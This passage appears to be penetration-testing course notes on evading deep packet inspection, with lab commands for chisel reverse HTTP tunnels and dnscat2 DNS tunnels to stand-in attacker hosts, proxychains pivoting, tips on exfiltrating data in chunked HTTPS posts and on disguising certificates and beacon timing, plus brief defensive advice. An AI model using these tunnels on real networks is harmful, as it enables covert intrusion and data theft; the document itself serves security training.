  19. <h2>TLDR;</h2>
  20. <p>Module 19 is where covert transport matters. The lab notes show how we tuned tunnels to look like sanctioned traffic. Here’s the upgraded sequence.</p>
  21. <h3>HTTP/WebSocket Tunneling with Chisel</h3>
  22. <pre><code># Attacker side
  23. chisel server -p 8443 --reverse --auth user:pass --key supersecret --tls-key server.key --tls-cert server.crt
  24. ​
  25. # Target side (reverse RDP)
  26. chisel client https://user:pass@attacker:8443 R:3389:127.0.0.1:3389
  27. </code></pre>
  28. <ul>
  29. <li>Customize TLS certificates to mimic internal PKI (matching CN/SAN). Store certificate metadata for the report.</li>
  30. <li>Randomize beacon intervals (<code>--keepalive 30s</code>) and throttle bandwidth (<code>--max-rate 200k</code>) to avoid traffic spikes.</li>
  31. <li>Log session start/end times and data volume.</li>
  32. </ul>
  33. <h3>DNS Tunneling with dnscat2</h3>
  34. <pre><code># Authoritative server
  35. sudo dnscat2-server --host tunnel.attacker.tld
  36. ​
  37. # Client with fixed sleep interval
  38. ./dnscat --dns domain=tunnel.attacker.tld,server=resolver.internal,port=53,delay=200
  39. </code></pre>
  40. <ul>
  41. <li>Delegate a subdomain (<code>tunnel.attacker.tld</code>) to your server; note NS records for the appendix.</li>
  42. <li>Restrict labels to &lt;50 bytes, rotate encryption keys, and adjust sleep intervals to blend with genuine queries.</li>
  43. <li>Capture query logs and PCAP samples to demonstrate the tunnel footprint.</li>
  44. </ul>
  45. <h3>Layering C2 and Tools</h3>
  46. <ul>
  47. <li>Route SOCKS traffic over the tunnel: <code>proxychains -q ssh analyst@internalhost</code> with <code>proxychains.conf</code> pointing to the chisel SOCKS port.</li>
  48. <li>For file exfil, compress and chunk data; send through HTTPS posts to avoid size anomalies.</li>
  49. </ul>
  50. <h3>Operational Safeguards</h3>
  51. <ul>
  52. <li>Maintain a <code>tunnels.md</code> ledger: protocol, endpoints, credentials, timing, cleanup commands.</li>
  53. <li>Use watch scripts to auto-kill tunnels on exit (<code>trap &#39;pkill -f chisel&#39; EXIT</code>).</li>
  54. <li>After engagement, revoke TLS certificates and destroy subdomains.</li>
  55. </ul>
  56. <h3>Defensive Insights</h3>
  57. <ul>
  58. <li>Recommend DNS response rate limiting, entropy and length monitoring, and TLS inspection that validates SNI against allowlists.</li>
  59. <li>Provide PCAP snippets and sample logs so defenders can write detections.</li>
  60. </ul>
  61. <p>DPI-aware tunneling is about subtlety. Tune the channel, monitor it constantly, and pair offensive results with precise defensive countermeasures.</p>

  69. <h4>19.1 HTTP Tunneling Theory and Practice</h4>
  70. <ul>
  71. <li>Learn about HTTP tunneling.</li>

  73. </ul>
  74. <h5>HTTP Tunneling Fundamentals</h5>
  75. <p>To begin our exploration of HTTP tunneling we will introduce a simple scenario. We have compromised CONFLUENCE01 and can exec commands via HTTP requests. When we try to pivot we are blocked by a highly restrictive network configuration.</p>
  76. <p>Deep Packet Inspection (DPI) is now terminating all outbound traffic except HTTP. All inbound ports on CONFLUENCE01 are blocked except TCP 8090. We can&#39;t rely on a standard rev shell, as it does not conform to HTTP standard and would be terminated by DPI. For the same reason we cannot create SSH remote port forward. The only traffic we can get through is HTTP, Wget and cURL for example.
  77. <em>This is a hypothetical scenario: we haven&#39;t actually implemented any deep packet inspection in the exercise lab! But imagining these restrictions can help us develop robust tunneling strategies.</em></p>
  78. <p>In this example, the FIREWALL/INSPEACTOR device has replaced the previous simple firewall. Also, MULTISERVER03 is blocked on the WAN iface.</p>
  79. <p>We have creds for the PGDATABASE01 server and need to figure out how to SSH there through CONFLUENCE01. We need a tunnel into the internal network that appears to be an outgoing HTTP connection from CONFLUENCE01.</p>
  80. <h5>HTTP Tunneling with Chisel</h5>
  81. <p>This scenario is perfect for <a href="https://github.com/jpillora/chisel">Chisel</a>, an HTTP tunneling tool that encapsulates our data stream within HTTP. It also uses SSH within the tunnel so our data will be encrypted.</p>
  82. <p>Chisel uses a client/server model, so a Chisel server must be set up to accept connections from the Chisel client. Various port forwarding options are available depending on the server and client config, with <em>reverse port forwarding</em> being particularly useful for us as it is similar to SSH remote port forwarding.</p>
  83. <p><em>Chisel can run on macOS, Linux, and Windows, and on various architectures on each. Older tools like HTTPTunnel offer similar tunneling functionality, but lack the flexibility and cross-platform capabilities of Chisel.</em></p>
  84. <p>We will run the Chisel server on our Kali machine to accept connections from Chisel client running on CONFLUENCE01. Chisel will bind a SOCKS proxy port on the Kali machine, encapsulating what we send through the SOCKS port, pushing it through the HTTP tunel with SSH encryption. The Chisel client decapsulates our traffic and pushed it to where it is addressed.</p>
  85. <p>The traffic between the Chisel client/server is HTTP formatted, allowing us to traverse the deep packet inspection solution, regardless of the HTTP packet contents. The Chisel server on our Kali system will listen on TCP 1080, as a SOCKS proxy port. All traffic sent to that port will be tunneled via HTTP to the client, where it is forwarded to its destination.</p>
  86. <p>Setup the Chisel server on Kali by referring to the <a href="https://github.com/jpillora/chisel#usage">usage guide</a>, we find the <code>--reverse</code> flag. Starting the server with this flag binds a SOCKS proxy port to the server on client connection.</p>
  87. <p>Before starting the server we need to copy the Chisel client bin to CONFLUENCE01. The Chisel server and client run from the same bin, just initializing as client or server as the first arg.</p>
  88. <p><em>If our target host is running a different operating system or architecture, we have to download and use the compiled binary for that specific operating system and architecture from the Chisel Github releases page.</em></p>
  89. <p>In this case both systems are AMD64 Linux, so we can use the same Chisel bin on both machines.</p>
  90. <p>To get Chisel bin onto CONFLUENCE01, we can serve it from our Kali machine over HTTP.</p>
